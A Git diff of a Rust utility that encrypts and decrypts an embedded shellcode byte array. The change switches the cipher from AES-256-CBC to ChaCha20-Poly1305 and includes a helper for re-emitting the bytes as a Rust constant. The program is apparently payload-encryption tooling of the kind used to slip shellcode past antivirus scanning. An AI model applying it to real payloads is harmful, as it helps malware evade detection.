@@ -1,20 +1,24 @@
-use aes::cipher::block_padding::Pkcs7;
-use aes::cipher::{BlockModeDecrypt, BlockModeEncrypt};
-use aes::Aes256;
-use cbc::cipher::KeyIvInit;
-use cbc::{Decryptor, Encryptor};
-use rand::{rng, RngExt};
+use chacha20poly1305::{ChaCha20Poly1305, KeyInit, Nonce, aead::Aead};
+use rand::{RngExt, rng};
 
-fn aes_enc(key: &[u8; 32], iv: &[u8; 16], plaintext: &[u8]) -> Vec<u8> {
-    let cipher = Encryptor::<Aes256>::new(key.into(), iv.into());
-    let ciphertext = cipher.encrypt_padded_vec::<Pkcs7>(plaintext);
-    ciphertext
+#[allow(deprecated)]
+fn enc(key: &[u8; 32], nonce: &[u8; 12], plaintext: &[u8]) -> Vec<u8> {
+    let cipher = ChaCha20Poly1305::new(key.into());
+    let cipher_text = cipher
+        .encrypt(Nonce::from_slice(nonce), plaintext)
+        .expect("Failed to encrypt");
+
+    cipher_text
 }
 
-fn aes_dec(key: &[u8; 32], iv: &[u8; 16], ciphertext: &[u8]) -> Vec<u8> {
-    let cipher = Decryptor::<Aes256>::new(key.into(), iv.into());
-    let decrypted_data = cipher.decrypt_padded_vec::<Pkcs7>(ciphertext).unwrap();
-    decrypted_data
+#[allow(deprecated)]
+fn dec(key: &[u8; 32], nonce: &[u8; 12], cipher_text: &[u8]) -> Vec<u8> {
+    let cipher = ChaCha20Poly1305::new(key.into());
+    let plaintext = cipher
+        .decrypt(Nonce::from_slice(nonce), cipher_text)
+        .expect("Failed to decrypt");
+
+    plaintext
 }
 
 fn generate_random_bytes(len: usize) -> Vec<u8> {
@@ -32,17 +36,6 @@ fn hex_dump(data: &[u8]) {
         print!("{:02x} ", byte);
     }
     println!();
-}
-
-fn print_rust_array(name: &str, data: &[u8]) {
-    print!("const {} = &[\n", name);
-    for (i, byte) in data.iter().enumerate() {
-        if i % 16 == 0 && i != 0 {
-            print!("\n");
-        }
-        print!("0x{:02x}, ", byte);
-    }
-    println!("\n]");
 }
 
 const SHELLCODE: &[u8] = &[
@@ -66,27 +59,41 @@ const SHELLCODE: &[u8] = &[
     0x65, 0x78, 0x65, 0x00,
 ];
 
+fn print_rust_array(name: &str, data: &[u8]) {
+    print!("const {} = &[\n", name);
+    for (i, byte) in data.iter().enumerate() {
+        if i % 16 == 0 && i != 0 {
+            print!("\n");
+        }
+        print!("0x{:02x}, ", byte);
+    }
+    println!("\n]");
+}
+
 fn main() {
-    print!("Original Shellcode:");
+    print!("Original shellcode:");
     hex_dump(SHELLCODE);
 
     let key: [u8; 32] = generate_random_bytes(32)
         .try_into()
         .expect("Failed to generate key");
-    print!("Generated Key:");
+
+    print!("Generated key:");
     hex_dump(&key);
 
-    let iv: [u8; 16] = generate_random_bytes(16)
+    let nonce: [u8; 12] = generate_random_bytes(12)
         .try_into()
-        .expect("Failed to generate IV");
-    print!("Generated IV:");
-    hex_dump(&iv);
+        .expect("Failed to generate nonce");
+    print!("Generated nonce:");
+    hex_dump(&nonce);
 
-    let ciphet_text = aes_enc(&key, &iv, SHELLCODE);
-    print!("Encrypted Shellcode:");
-    hex_dump(&ciphet_text);
+    let cipher_text = enc(&key, &nonce, SHELLCODE);
+    print!("Encrypted shellcode:");
+    hex_dump(&cipher_text);
 
-    let plain_text = aes_dec(&key, &iv, &ciphet_text);
-    print!("Decrypted Shellcode:");
+    let plain_text = dec(&key, &nonce, &cipher_text);
+    print!("Decrypted shellcode:");
     hex_dump(&plain_text);
+
+    // print_rust_array("DECRYPTED_SHELLCODE", &plain_text);
 }
